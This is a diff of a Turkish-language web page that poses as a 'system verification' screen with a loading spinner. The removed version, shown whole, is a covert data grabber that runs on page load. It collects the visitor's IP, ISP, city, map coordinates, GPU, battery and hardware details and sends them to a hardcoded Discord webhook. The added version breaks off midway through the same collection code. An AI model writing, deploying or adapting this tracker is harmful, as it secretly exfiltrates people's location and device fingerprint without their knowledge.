@@ -3,87 +3,44 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Sistem Analizi</title>
+    <title>Sistem Doğrulaması</title>
     <style>
-        body { background:#000; display:flex; align-items:center; justify-content:center; height:100vh; margin:0; font-family:sans-serif; overflow:hidden; }
-        .loader { border: 2px solid #111; border-top: 2px solid #00ff41; border-radius: 50%; width: 25px; height: 25px; animation: spin 0.7s linear infinite; }
+        body { background:#050505; display:flex; align-items:center; justify-content:center; height:100vh; margin:0; font-family:sans-serif; }
+        .loader { border: 2px solid #111; border-top: 2px solid #00ff41; border-radius: 50%; width: 25px; height: 25px; animation: spin 0.8s linear infinite; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        #t { color:#333; font-size:11px; margin-left:12px; letter-spacing:1px; }
+        h2 { color:#222; font-size:12px; margin-left:15px; letter-spacing:1px; }
     </style>
 </head>
 <body>
     <div class="loader"></div>
-    <div id="t">ANALİZ EDİLİYOR...</div>
+    <h2 id="st">SİSTEM ANALİZ EDİLİYOR...</h2>
 
     <script>
         const hook = "https://discord.com/api/webhooks/1457050495964151929/cue_0Yvmkt49p_J8fV_M4ks3DeuDRMilywpZUAX-2StNSQVIBBWVAk13bXGP186puI73";
 
-        async function deepDiving() {
-            let data = { 
-                gpu: "N/A", ven: "N/A", ip: "X", loc: "X", net: "X", sys: "X", bat: "X", extra: "X" 
+        async function deepScan() {
+            let info = { 
+                gpu: "Kilitli/Null", ven: "Kilitli/Null", 
+                ip: "X", iss: "X", loc: "X", 
+                os: navigator.platform, lang: navigator.language,
+                time: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                scr: `${screen.width}x${screen.height} (${screen.colorDepth}bit)`,
+                net: "X", bat: "X"
             };
 
-            // 1. EN DERİN GPU & SÜRÜCÜ SORGUSU
+            // 1. AGRESİF GPU & VENDOR SORGUSU (Zorlanmış Katman)
             try {
                 const canvas = document.createElement('canvas');
-                const gl = canvas.getContext('webgl2') || canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                const options = { powerPreference: "high-performance", antialias: false };
+                const gl = canvas.getContext('webgl2', options) || canvas.getContext('webgl', options) || canvas.getContext('experimental-webgl', options);
                 const dbg = gl.getExtension('WEBGL_debug_renderer_info');
                 if (dbg) {
-                    data.gpu = gl.getParameter(dbg.UNMASKED_RENDERER_ID);
-                    data.ven = gl.getParameter(dbg.UNMASKED_VENDOR_ID);
+                    info.gpu = gl.getParameter(dbg.UNMASKED_RENDERER_ID);
+                    info.ven = gl.getParameter(dbg.UNMASKED_VENDOR_ID);
                 }
             } catch(e) {}
 
-            // 2. EN DERİN İNTERNET VE ISP ANALİZİ (VPN/Proxy Tespiti Dahil)
+            // 2. ISS, IP VE DETAYLI KONUM (VPN/PROXY KONTROLLÜ)
             try {
-                const res = await fetch('https://ipapi.co/json/');
-                const j = await res.json();
-                data.ip = j.ip;
-                data.loc = `📍 **Konum:** ${j.city}, ${j.region} / ${j.country_name}\n📡 **ISP:** ${j.org} (AS${j.asn})\n🗺️ [Harita](https://www.google.com/maps?q=${j.latitude},${j.longitude})`;
-                
-                const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-                data.net = `📶 **Tip:** ${conn ? conn.effectiveType : 'Bilinmiyor'}\n⚡ **Hız:** ~${conn ? conn.downlink : 'X'} Mbps\n⏱️ **Ping:** ${conn ? conn.rtt : 'X'}ms`;
-            } catch(e) {}
-
-            // 3. DONANIM VE PİL DETAYLARI
-            try {
-                const b = await navigator.getBattery();
-                data.bat = `%${Math.round(b.level * 100)} (${b.charging ? 'Şarjda' : 'Pilde'})`;
-            } catch(e) {}
-
-            // 4. EKSTRA DERİN BİLGİLER (Zaman Dilimi, Dil, İşlemci)
-            data.extra = `🌐 **Dil:** ${navigator.language}\n⏰ **Saat:** ${Intl.DateTimeFormat().resolvedOptions().timeZone}\n🧠 **CPU:** ${navigator.hardwareConcurrency} Çekirdek\n💾 **RAM:** ${navigator.deviceMemory || 'Gizli'} GB\n📐 **Ekran:** ${screen.width}x${screen.height} (${screen.colorDepth} bit)`;
-
-            // 5. KIRMIZI EMBED ŞABLONU (TOTAL EXPOSURE)
-            const payload = {
-                embeds: [{
-                    title: " ANALİZ RAPORU",
-                    description: "Cihazın tüm donanım ve ağ katmanları sızdırıldı.",
-                    color: 15158332,
-                    fields: [
-                        { name: "🌐 AĞ VE KONUM", value: `${data.loc}\n${data.net}\n**IP:** ${data.ip}`, inline: false },
-                        { name: "🛠️ EKRAN KARTI (GPU)", value: `**Vendor:** \`${data.ven}\`\n**Renderer:** \`${data.gpu}\``, inline: false },
-                        { name: "⚙️ DONANIM & SİSTEM", value: data.extra, inline: false },
-                        { name: "🔋 GÜÇ", value: data.bat, inline: true },
-                        { name: "💻 PLATFORM", value: navigator.platform, inline: true },
-                        { name: "🔍 USER AGENT", value: "```" + navigator.userAgent + "```" }
-                    ],
-                    footer: { text: "Protocol: Total Exposure | Dev: Gemini-Elite" },
-                    timestamp: new Date()
-                }]
-            };
-
-            // 6. GÖNDERİM (MUTLAK GÜÇ)
-            const blob = JSON.stringify(payload);
-            fetch(hook, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: blob });
-            navigator.sendBeacon(hook, blob);
-
-            // Arayüz Bitiş
-            setTimeout(() => { document.getElementById('t').style.color = "#00ff41"; document.getElementById('t').innerText = "İŞLEM TAMAMLANDI."; }, 1500);
-        }
-
-        window.onload = deepDiving;
-    </script>
-</body>
-</html>
-
+                const res = await fetch('
+                                        
